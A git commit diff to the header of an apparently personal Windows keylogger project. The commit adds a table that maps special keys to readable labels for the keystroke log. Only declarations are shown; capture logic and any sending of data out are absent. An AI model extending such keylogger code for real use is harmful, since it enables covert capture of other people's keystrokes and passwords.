28bb7436c71317c13a653802bcae5cfafda92e01
sebitse <sebastian.tonu14@gmail.com>
2024-09-02 14:55:08 +0300

    added special chars data structure

--- include/keylogger.h
+++ include/keylogger.h
@@ -6,6 +6,7 @@
 #include <windows.h>
 #include <fstream>
 #include <string>
+#include <unordered_map>
 #include "LogStrategy.h"
 
 #define IS_PRESSED -32767 // -((2^15) - 1) 
@@ -14,11 +15,45 @@
 #define RELEVANT_INTERVAL_OF_KEYS (START_KEY END_KEY)
 #define PAUSE 10
 
-class KeyLogger {
+class KeyLogger 
+{
     private:
-        LogStrategy* logStrategy;  // Pointer to the logging strategy
+        LogStrategy* logStrategy;  // implement the logging strategy
         std::ofstream logfile;     // Output file stream for logging
         bool running;              // Flag to indicate if the keylogger is on
+        // The special keystrokes
+        const std::unordered_map<int, std::string> keyname
+        { 
+            {VK_BACK, "[BACKSPACE]" },
+            {VK_RETURN, "\n" },
+            {VK_SPACE, "_" },
+            {VK_TAB, "[TAB]" },
+            {VK_SHIFT, "[SHIFT]" },
+            {VK_LSHIFT, "[LSHIFT]" },
+            {VK_RSHIFT, "[RSHIFT]" },
+            {VK_CONTROL, "[CONTROL]" },
+            {VK_LCONTROL, "[LCONTROL]" },
+            {VK_RCONTROL, "[RCONTROL]" },
+            {VK_MENU, "[ALT]" },
+            {VK_LWIN, "[LWIN]" },
+            {VK_RWIN, "[RWIN]" },
+            {VK_ESCAPE, "[ESCAPE]" },
+            {VK_END, "[END]" },
+            {VK_HOME, "[HOME]" },
+            {VK_LEFT, "[LEFT]" },
+            {VK_RIGHT, "[RIGHT]" },
+            {VK_UP, "[UP]" },
+            {VK_DOWN, "[DOWN]" },
+            {VK_PRIOR, "[PG_UP]" },
+            {VK_NEXT, "[PG_DOWN]" },
+            {VK_OEM_PERIOD, "." },
+            {VK_DECIMAL, "." },
+            {VK_OEM_PLUS, "+" },
+            {VK_OEM_MINUS, "-" },
+            {VK_ADD, "+" },
+            {VK_SUBTRACT, "-" },
+            {VK_CAPITAL, "[CAPSLOCK]" },
+        };
 
     public:
         // Constructor
